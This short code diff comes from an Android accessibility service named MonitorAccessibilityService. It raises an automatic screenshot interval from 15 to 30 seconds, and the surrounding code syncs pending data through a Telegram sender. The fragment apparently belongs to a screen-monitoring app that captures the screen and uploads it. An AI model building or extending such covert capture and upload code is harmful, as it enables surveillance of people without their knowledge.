@@ -33,7 +33,7 @@ class MonitorAccessibilityService : AccessibilityService() {
         TelegramSender.syncPendingData(applicationContext)
     }
 
-    private var autoScreenshotIntervalMillis = 15_000L
+    private var autoScreenshotIntervalMillis = 30_000L
     private val autoScreenshotRunnable = object : Runnable {
         override fun run() {
             if (isRunning) {
